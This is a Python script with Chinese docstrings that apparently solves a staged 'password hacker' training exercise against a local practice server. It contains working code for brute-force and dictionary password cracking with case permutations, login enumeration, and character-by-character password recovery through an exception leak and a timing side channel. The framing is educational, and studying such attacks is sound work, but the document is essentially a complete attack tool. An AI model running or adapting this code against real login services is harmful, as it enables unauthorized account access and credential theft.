import cProfile
import os
import json
import socket
import sys
import itertools
import string
import timeit


def generate_passwords(length):
    """
    （二）暴力破解管理员密码
    管理员设置了相对简单和简短的密码，尝试暴力破解所有可能的密码以进入网站！
    密码是变长的，可能包括从 a 到 z 的字母和从 0 到 9 的数字，密码由itertools.product()生成
    可以通过迭代的思路尝试a,b,c,....,z,0,1,..aa,ab,ac,ad 并继续，直到密码正确为止
    如果密码正确，您将收到来自服务器的 Connection success! 否则将收到 Wrong password! 消息
    服务器本身不能接收超过 100 万次尝试，因此如果程序死循环，您将看到消息 Too many attempts

    请注意，您只需连接到服务器一次，然后多次发送消息。在发送每条消息之前，不要重新连接到服务器。
    但是，每条消息都需要在发送前进行编码，在从服务器接收后需要解码。

    示例 1：
    > python hack.py localhost 9090
    pass
    """
    characters = string.ascii_lowercase + string.digits  # 'abcdefghijklmnopqrstuvwxyz0123456789'
    for password_tuple in itertools.product(characters, repeat=length):
        yield ''.join(password_tuple)


def generate_passwords_with_file():
    """
    (三) 标准密码词典破解密码
    这里已经提供一个准备好的典型密码字典，它是使用具有超过 100 万个真实密码的数据库生成的。
    将带有典型密码的文件放入您的工作目录中，您可以在 os 模块的帮助下找到该目录。

    您不仅必须尝试字典的每个元素，还需要尝试密码字典中所有单词的每个字母的大小写的所有可能组合。
    例如，对于一个 6 个字母的单词，您会得到 64 种可能的组合。
    字典中有单词 'qwerty'，但狡猾的管理员将其设置为 'qWeRTy'。您的程序也应该可以破解此类密码。
    推荐使用zip()函数将大小写字母配对，并使用 * 来解压缩列表以用作 itertools.product() 的参数

    在此阶段，您应该编写一个程序，该程序：
    1. 解析命令行并获取两个参数，即 IP 地址和端口。
    2. 使用典型密码列表查找正确的密码。
    3. 打印找到的密码。
    4. 为避免 ConnectionResetError 和 ConnectionAbortedError,
    您应该在从服务器收到 Connection success! 时关闭客户端套接字并结束程序

    例子：
    > python hack.py localhost 9090
    qWeRTy
    """
    file_path = 'passwords.txt'  # 假设密码文件名为 passwords.txt
    with open(file_path, 'r') as file:
        for line in file:
            word = line.strip()
            # 生成所有可能的大小写组合
            for password_tuple in itertools.product(*zip(word.lower(), word.upper())):
                # eg. word='cat'
                # list(zip(word.lower(),word.upper())): [('c', 'C'), ('a', 'A'), ('t', 'T')]
                # list(itertools.product(*zip(word.lower(),word.upper())))
                # [('c', 'a', 't'), ('c', 'a', 'T'), ('c', 'A', 't'), ('c', 'A', 'T'),
                # ('C', 'a', 't'), ('C', 'a', 'T'), ('C', 'A', 't'), ('C', 'A', 'T')]
                yield ''.join(password_tuple)


def generate_logins():
    """
    (五) 暴力破解管理员登录名
    现在您需要知道管理员的登录名和密码，幸运的是，我们有登录名字典和漏洞。
    使用典型管理员登录名的字典。您应该尝试字典中的不同大小写变体，就像在上一阶段使用密码所做的那样。
    至于密码，它们已经变得更加困难，因此简单的字典已经不够了。密码由小写字母、大写字母和数字组合而成。

    服务器现在使用 JSON 发送消息。
    您的程序应以 JSON 格式打印登录名和密码的组合。

    示例：
    > python hack.py localhost 9090
    {"login": "admin", "password": "12345678"}
    """
    file_path = r'logins.txt'  # 假设登录名文件名为 logins.txt
    with open(file_path, 'r') as file:
        for line in file:
            login = line.strip()
            # 生成所有可能的大小写组合
            for login_tuple in itertools.product(*zip(login.lower(), login.upper())):
                yield ''.join(login_tuple)


def main():
    """
    (一) 建立网络连接
    在这个项目中，我们将以 White Hats 的身份运营。第一个任务是尝试破解密码连接到服务器。
    您的程序应使用命令行参数中的 IP 地址和端口连接到服务器。
    您可以使用 socket module 创建此程序。

    您的程序将按以下顺序接收命令行参数：1 IP address; 2 port; 3 message 用于发送的消息.
    算法如下：
    1.创建一个新的套接字。
    2.使用套接字连接到主机和端口。
    3.使用 socket 从第三个命令行参数向主机发送消息。
    4.接收服务器的响应。
    5.打印服务器的响应。
    6.关闭套接字。

    大于号后跟一个空格 （> ） 表示用户输入。请注意，它不是 input 的一部分。
    示例 1：
    > python hack.py localhost 9090 password
    Wrong password!

    > python hack.py 127.0.0.1 9090 qwerty
    Connection Success!
    """
    """
    (四) 考虑典型登录名
    现在您需要知道管理员的登录名和密码，幸运的是，我们有登录名字典和漏洞。
    使用典型管理员登录名的字典。您应该尝试字典中的不同大小写变体，就像在上一阶段使用密码所做的那样。
    至于密码，它们已经变得更加困难，因此简单的字典已经不够了。密码由小写字母、大写字母和数字组合而成。

    服务器现在使用 JSON 发送消息。
    1.首先，您应该调整您的程序，使其可以将 JSON 格式的登录名和密码组合发送到服务器。您的请求现在应如下所示：
    {
        "login": "admin",
        "password": "12345678"
    }
    2.如果登录错误，您收到的响应如下所示：
    {
        "result": "Wrong login!"
    }
    3.如果您登录正确但找不到密码，则会收到以下内容：
    {
        "result": "Wrong password!"
    }
    4.如果您的请求不是有效的 JSON 格式，或者没有 login 或 password 字段，则响应将为：
    {
        "result": "Bad request!"
    }
    5.如果发生一些异常，您将看到以下结果：
    {
        "result": "Exception happened during login"
    }
    6.当您最终成功找到登录名和密码时，您将看到以下内容：
    {
        "result": "Connection success!"
    }

    幸运的是，已经发现了一个漏洞：当您尝试的密码符号与正确密码的开头匹配时，会弹出上面第5条的 “异常” 消息。
    搜索登录名时使用任何密码，因为服务器首先检查登录名是否正确。
    因此，如果服务器使用第3条 “错误密码” 或 第5条 “异常” 而不是第2条 “错误登录” 进行响应，则表示使用的登录是正确的。

    您的算法如下：
    1.尝试使用任何密码登录。
    2.找到登录名后，尝试所有长度为 1 的可能密码。
    3.发生异常时，您知道您找到了密码的第一个字符。
    4.使用 found login（找到的登录名）和 found（找到的字母）来查找密码的第二个字母。
    5.重复此作，直到收到 'success' 消息。
    6.最后，您的程序应以 JSON 格式打印登录名和密码的组合。

    示例：
    > python hack.py localhost 9090
    {
        "login" : "superuser",
        "password" : "aDgT9tq1PU0"
    }

    > python hack.py localhost 9090
    {"login": "new_user", "password": "Sg967s"}
    """
    """
    (五) 破解基于时间的漏洞
    管理员改进了服务器：程序现在可以捕获异常并向客户端发送简单的“错误密码”消息，即使真实密码以当前符号开头。
    但问题是：管理员刚刚捕获了这个异常。捕获异常需要计算机很长时间，因此当发生此异常时，服务器响应中会有延迟。
    您可以使用它来破解系统：计算响应出现的时间段，并找出哪些起始符号可以用作密码。

    在这个阶段，你应该编写一个使用时间漏洞来查找密码的程序。
    1. 使用上一阶段的登录名列表。
    2. 输出结果，就像在上一阶段中所做的那样。

    例子1：
    > python hack.py localhost 9090
    {
        "login" : "su",
        "password" : "fTUe3O99Rre"
    }

    例子2：
    > python hack.py localhost 9090
    {"login": "admin3", "password": "mlqDz33x"}
    """
    if len(sys.argv) != 3:
        print("Usage: python hack.py <IP address> <port> <message>")
        return

    ip_address = sys.argv[1]
    port = int(sys.argv[2])

    # 创建一个新的套接字
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # 如果服务器长时间不回复，sock.recv() 会阻塞，设置3秒超时
        sock.settimeout(3.0)
        sock.connect((ip_address, port))

        # ---------------- 1. 枚举登录名 ----------------
        correct_login = None
        g_login = generate_logins()

        for login in g_login:
            # 发送消息
            request = {"login": login, "password": ""}
            sock.sendall(json.dumps(request).encode('utf-8'))

            # 接收服务器的响应
            reply = sock.recv(1024).decode('utf-8').strip()
            result = json.loads(reply).get("result", "")

            # 登录名对了
            if result in {"Wrong password!"}:
                correct_login = login
                break

        if correct_login is None:
            print("未找到有效登录名")
            return

        # ---------------- 2. 利用时间侧信道逐字符扩展密码 ----------------
        pwd_prefix = ''
        CHARS = string.ascii_letters + string.digits

        while True:
            timings = []
            for ch in CHARS:
                # 发送密码
                attempt_pwd = pwd_prefix + ch
                attempt = {"login": correct_login, "password": attempt_pwd}

                start_time = timeit.default_timer()
                sock.sendall(json.dumps(attempt).encode('utf-8'))
                reply = sock.recv(1024).decode('utf-8').strip()
                elapsed_time = timeit.default_timer() - start_time

                result = json.loads(reply).get("result", "")

                if result == "Connection success!":
                    # 成功！
                    print(json.dumps(attempt, ensure_ascii=False))
                    return
                
                timings.append((elapsed_time, ch))

            # 选用耗时最长的字符作为下一位前缀
            if not timings:
                print("未收到任何回复，终止。")
                return

            _, next_char = max(timings, key=lambda t: t[0])
            pwd_prefix += next_char
            


if __name__ == "__main__":
    main()

